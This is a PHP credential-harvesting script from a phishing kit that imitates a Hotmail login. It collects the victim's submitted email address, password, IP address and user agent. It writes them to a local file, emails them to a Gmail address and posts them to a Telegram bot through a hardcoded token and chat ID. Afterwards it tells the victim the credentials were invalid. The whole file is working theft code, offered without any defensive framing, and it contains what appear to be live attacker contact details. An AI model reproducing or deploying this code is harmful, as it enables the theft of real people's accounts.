<?php

$email = trim($_POST['user']);
$password = trim($_POST['pass']);

if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|--------------- 👹👹NEW HOTMAIL GIFT:BOY👿ALONE👿 👹👹-------------| \n";
	$message .= "EMAIL🥇            : ".$email."\n";
	$message .= "Password🥇           : ".$password."\n";
	$message .= "|--------------- I N F O 🥇| I P🥇 -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--------------- 🦞🦞  http://www.geoiptool.com/?IP=$ip 🦞🦞-------|\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|--------------- 👹👹 BOY👿ALONE👿 👹👹-------------| \n";
	$send = $Receive_email;
	$Receive_email="lewinfred15@gmail.com";
    $telegram_id = "5936750105";//Your Telegram ID. Ex»» 143626030
    $telegram_token = "5967721817:AAH5KP76xp7WydOsFQVDaD4mBJ63rxCIimQ";//Your Telegram Token.Ex»»525456:AAEpYQU-1snquJJ6eLblSd
	$subject = "NEW HOTMAIL GIFT FROM BOY👿ALONE👿 : $ip";
    mail($send, $subject, $message);  
	$save = fopen("Hotmail.txt","a+");
     fwrite($save,$message);
        fclose($save);

$url2 = "https://api.telegram.org/bot".$telegram_token."/sendMessage?chat_id=".$telegram_id;
    $url2 = $url2 . "&text=" . urlencode($message);
    $ch2 = curl_init();
    $optArray = array(
            CURLOPT_URL => $url2,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch2, $optArray);
    $result2 = curl_exec($ch2);
    curl_close($ch2);
    return $result2;
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    //echo json_encode($data);
?>
